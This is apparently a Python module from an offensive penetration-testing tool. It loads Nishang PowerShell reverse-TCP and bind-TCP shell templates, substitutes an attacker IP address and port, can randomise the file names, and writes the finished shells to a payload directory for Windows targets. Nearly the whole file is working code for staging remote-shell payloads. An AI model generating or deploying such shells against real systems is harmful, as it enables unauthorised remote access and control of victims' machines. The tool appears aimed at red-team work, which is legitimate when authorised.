import base64,os,random,string,gzip 
from lib import arguments,logger

class Shell: # create a Shell datastore for the each of the following datatypes
	def __init__(self,name,type,filename,location,content):
		self.name = name
		self.type = type
		self.filename = filename
		self.location = location
		self.content = content

args = arguments.get_args()
absolute_path = os.path.dirname(os.path.realpath(__file__))
absolute_path=str(absolute_path).replace('/lib','/')

def replace_template_variables(content): # replace the template variables with the appropriate data
	if "TEMPLATEIPADDRESS" in content:
		content = content.replace("TEMPLATEIPADDRESS",args.ip_address)
	if "TEMPLATEPORT" in content:
		content = content.replace("TEMPLATEPORT",args.cradle_port)
	return content

def write_shell_out(filename,content):
	if args.randomize_names:
		filename = ''.join(random.choice(string.ascii_lowercase) for i in range(12))
	else:
		filename = filename

	if not os.path.exists(args.payload_directory):
		try:
			os.mkdir(args.payload_directory)
		except Exception as e:
			print('Got error: %s' % logger.red_fg(e))
			quit()
	location = args.payload_directory + filename
	with open(location, "w") as destination_file:
		destination_file.write(content)
	return filename,location # write the shell and return the name and location of it

# the following all use a similar structure, fairly self-explanatory.
def nishang_reverse_tcp():
	name = 'Nishang Reverse TCP'
	type = 'Reverse TCP'
	filename = 'Invoke-PowerShellTcp.ps1'
	path_to_read = absolute_path + args.resource_directory + filename
	content = open(path_to_read).read()
	content = replace_template_variables(content)
	filename,location = write_shell_out(filename,content)
	shell = Shell(name,type,filename,location,content)
	return shell

def nishang_bind_tcp():
	name = 'Nishang Bind TCP'
	type = 'Bind TCP'
	filename = 'Invoke-PowerShellTcpOneLineBind.ps1'
	path_to_read = absolute_path + args.resource_directory + filename
	content = open(path_to_read).read()
	content = replace_template_variables(content)
	filename,location = write_shell_out(filename,content)
	shell = Shell(name,type,filename,location,content)
	return shell

def generate_all_shells():
	# This function takes in all the configured shells and ensures that they are encoded into Base64/UTF16-LE, thats all.
	shells = []
	if args.operating_system == None:
		shells.append(nishang_reverse_tcp())
		shells.append(nishang_bind_tcp())
	elif "windows" in args.operating_system.lower():
		shells.append(nishang_reverse_tcp())
		shells.append(nishang_bind_tcp())
	elif "linux" in args.operating_system.lower():
		print("Coming soon!")
		quit()
	return shells